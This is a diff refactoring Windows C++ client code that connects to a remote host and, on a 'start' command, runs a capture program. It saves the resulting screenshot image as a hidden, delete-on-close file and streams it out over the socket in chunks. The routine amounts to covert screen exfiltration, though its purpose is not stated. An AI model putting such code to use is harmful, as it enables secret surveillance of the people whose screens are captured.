@@ -396,6 +396,7 @@ BOOL Online(int port, std::string& ip, const char* command)
 	char beforeName[100] = "##name##";
 	DWORD username_len = 100;
 	int check = 0;
+	const int imagePartSize = 1024;
 
 	if (WSAStartup(0x0101, &WsaData))
 		return false;
@@ -431,51 +432,37 @@ BOOL Online(int port, std::string& ip, const char* command)
 		return false;
 	}
 
-	char startSending[100] = "start";
-	char b[50];
+	char startScreening[100] = "start";
+	char buffer[50];
 
 	while (true)
 	{
-		//LaunchProcess("C:\\Users\\mi_ai\\source\\repos\\ServiceDebager\\x64\\Release\\ServiceDebager.exe", "!!!", true);
-
-		check = recv(s, b, 50, 0);
+		check = recv(s, buffer, 50, 0);
 
 		if (check == 50)
 		{
-			if (!strcmp(startSending, b))
+			if (!strcmp(startScreening, buffer))
 			{
-				b[1] = '\0';
-				char buffer[1024];
-				char start[50];
+				buffer[1] = '\0';
+				char imagePartBuffer[imagePartSize];
+				char sendingImageInfo[50];
 				DWORD check = 0;
 
-				std::string temp;
-				std::string temp2;
-				std::string jpjname;
+				std::string imageInfo;
+				std::string imagePath;
 
-				jpjname = "C:\\Users\\Public\\Pictures\\";
+				imagePath = "C:\\Users\\Public\\Pictures\\";
 
-				std::stringstream ss;
-				std::stringstream st;
-				st << time(NULL);
-				ss << st.rdbuf();
-				temp += ss.str();
-				temp += ".jpg";
-				temp2 += ss.str();
-				temp2 += ".jpg";
-				jpjname += ss.str();
-				jpjname += ".jpg";
+				std::string imageTime = std::to_string(time(NULL));
+				imageInfo += imageTime;
+				imageInfo += ".jpg";
+				imagePath += imageTime;
+				imagePath += ".jpg";
 
-				/////////////////////////////////////////////////////////////////////////////////////////
+				LaunchProcess(&command[0], imageTime.c_str(), false);
 
-				LaunchProcess(&command[0], &st.str()[0], false);
-
-				//////////////////////////////////////////////////////////////////////////////////////////
-
-				char tt[100];
-				OemToCharA(&jpjname[0], tt);
-				HANDLE rFile = CreateFileA(tt, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
-				SetFileAttributesA(tt, FILE_ATTRIBUTE_HIDDEN);
+				HANDLE rFile = CreateFileA(imagePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+				SetFileAttributesA(imagePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
 				if (rFile == INVALID_HANDLE_VALUE)
 				{
@@ -487,25 +474,21 @@ BOOL Online(int port, std::string& ip, const char* command)
 				LARGE_INTEGER tSize = { 0 };
 				GetFileSizeEx(rFile, &tSize);
 				long int size = tSize.QuadPart;
-				int parts = size / 1024;
-				int last = size - 1024 * parts;
+				int parts = size / imagePartSize;
+				int last = size - imagePartSize * parts;
 
 				if (size)
 				{
-					std::stringstream ss2;
-					ss2 << parts;
-					temp += '\n';
-					temp += ss2.str();
-					temp += '\n';
-					std::stringstream ss3;
-					ss3 << last;
-					temp += ss3.str();
+					imageInfo += '\n';
+					imageInfo += std::to_string(parts);
+					imageInfo += '\n';
+					imageInfo += std::to_string(last);
 					int i = 0;
-					if (temp.size() > 0)
+					if (imageInfo.size() > 0)
 					{
-						while (i < temp.size())
-							start[i] = temp[i++];
-						start[i] = '\0';
+						while (i < imageInfo.size())
+							sendingImageInfo[i] = imageInfo[i++];
+						sendingImageInfo[i] = '\0';
 					}
 					else
 					{
@@ -514,13 +497,10 @@ BOOL Online(int port, std::string& ip, const char* command)
 						return 0;
 					}
 
-					///////////////////////////////////////////////////conection
+					int ImagePartCounter = 0;
+					char startSending[50] = "start";
 
-					int n = 0;
-					int t = 1024;
-					char cstart[50] = "start";
-
-					if (50 != send(s, cstart, 50, 0))
+					if (50 != send(s, startSending, 50, 0))
 					{
 						writeLog("sending error");
 						CloseHandle(rFile);
@@ -528,7 +508,7 @@ BOOL Online(int port, std::string& ip, const char* command)
 						return false;
 					}
 
-					if (50 != send(s, start, 50, 0))
+					if (50 != send(s, sendingImageInfo, 50, 0))
 					{
 						writeLog("sending error");
 						CloseHandle(rFile);
@@ -536,13 +516,11 @@ BOOL Online(int port, std::string& ip, const char* command)
 						return false;
 					}
 
-					writeLog(start);
-
-					while (n < parts)
+					while (ImagePartCounter < parts)
 					{
-						if (ReadFile(rFile, buffer, 1024, &check, NULL))
+						if (ReadFile(rFile, imagePartBuffer, imagePartSize, &check, NULL))
 						{
-							if (check != 1024)
+							if (check != imagePartSize)
 							{
 								CloseHandle(rFile);
 								closesocket(s);
@@ -557,17 +535,17 @@ BOOL Online(int port, std::string& ip, const char* command)
 							return false;
 						}
 
-						if (t != send(s, buffer, t, 0))
+						if (imagePartSize != send(s, imagePartBuffer, imagePartSize, 0))
 						{
 							writeLog("sending error");
 							CloseHandle(rFile);
 							closesocket(s);
 							return false;
 						}
-						n++;
+						ImagePartCounter++;
 					}
 
-					if (ReadFile(rFile, buffer, last, &check, NULL))
+					if (ReadFile(rFile, imagePartBuffer, last, &check, NULL))
 					{
 						if (check != last)
 						{
@@ -584,7 +562,7 @@ BOOL Online(int port, std::string& ip, const char* command)
 						return 0;
 					}
 
-					if (last != send(s, buffer, last, 0))
+					if (last != send(s, imagePartBuffer, last, 0))
 					{
 						writeLog("sending last part error");
 						CloseHandle(rFile);
